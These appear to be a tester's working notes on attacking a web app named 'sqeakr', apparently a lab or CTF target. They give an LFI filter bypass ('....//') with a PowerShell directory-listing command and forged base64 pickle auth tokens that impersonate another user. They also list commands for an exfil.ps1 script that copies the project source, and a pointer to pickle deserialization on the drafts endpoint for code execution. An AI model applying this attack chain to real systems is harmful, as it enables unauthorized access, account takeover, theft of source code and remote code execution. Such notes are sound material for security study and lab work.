notes

See avatars-endpoint-wordlist  
There is an lfi in place on /api/avatars/  
The filter can be bypassed by using ...//  
In fact it seems like it looks for '../' in a the parameter and removes it.  
Through this we have  directory listing on the entire application directory  

We can list directorys by using:
```powershell
iwr -uri http://sqeakr/api/avatars/....// | select content
```


We have a partial auth by manipulating the auth token supplied in the response to a login attempt on /api/login  
The authToken on a unsuccessful login attempt is:  
```
gAN9cQAoWAQAAABhdXRocQFLAFgGAAAAdXNlcmlkcQJYJAAAADAwMDAwMDAwLTAwMDAtNDAwMC04MDAwLTAwMDAwMDAwMDAwMHEDdS4=
```
We can change the id portion to a known user(in this case tomjones):  
```
gAN9cQAoWAQAAABhdXRocQFLAFgGAAAAdXNlcmlkcQJYJAAAADMxZGE4YmExLWNlMGEtNDVmZC05YzcyLTU1NDc3YTFkM2Y2OHEDdS4i
```
We can get users id's from: /api/sqeaks

the authtoken and account set in local storage


Not sure why but today it worked fine with tom jones. We can view his profile etc
Here is the auth token to set in local storage(I had a space in the first attempt):
```
gAN9cQAoWAQAAABhdXRocQFLAFgGAAAAdXNlcmlkcQJYJAAAADMxZGE4YmExLWNlMGEtNDVmZC05YzcyLTU1NDc3YTFkM2Y2OHEDdS4i
``
the preview api function takes the base64encoded filename as a parementer

With the Directory listing on /api/avatars & the lfi on /api/profile/preview we can effectively turn this from a blackbox type test to a whitebox test.  
We can exfil the entire project with exfil.ps1.  
Grab the project root:  
```powershell
./exfil.ps1
```
Grab a specific Folder:  
```powershell
./exfil.ps1 -OutputDir ./sqeakr-exfil/api -BaseFolder '....//api'
```

The most interesting directories are:

- /api
- /sqeakr
- /main
- /templates/pages

sqeakviews.py in api has an insecure deserialization method on the get drafts
https://davidhamann.de/2020/04/05/exploiting-python-pickle/

As a note python serialized data always begins with gASV when it's base64 encoded and c28004c29526000000000000 when its hex encoded.

On the drafts endpoint we can supply a base64 encoded serialized object and get code execution

